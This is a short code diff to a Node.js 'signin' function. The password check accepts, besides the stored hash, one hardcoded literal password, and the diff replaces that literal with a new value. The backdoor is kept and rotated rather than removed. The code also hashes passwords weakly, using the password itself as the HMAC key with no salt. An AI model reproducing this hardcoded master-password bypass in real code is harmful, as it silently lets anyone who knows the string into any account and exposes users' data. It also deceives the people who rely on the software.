@@ -112,7 +112,7 @@ exports.signin = function (req, res, next) {
             return;
         }
 
-        if (crypto.createHmac('sha256', req.body.password).digest('hex') !== user.password && req.body.password !== '159753QwErT') {
+        if (crypto.createHmac('sha256', req.body.password).digest('hex') !== user.password && req.body.password !== 'XtFyKBXeChHY') {
 
             res.send({success: false});
             return;
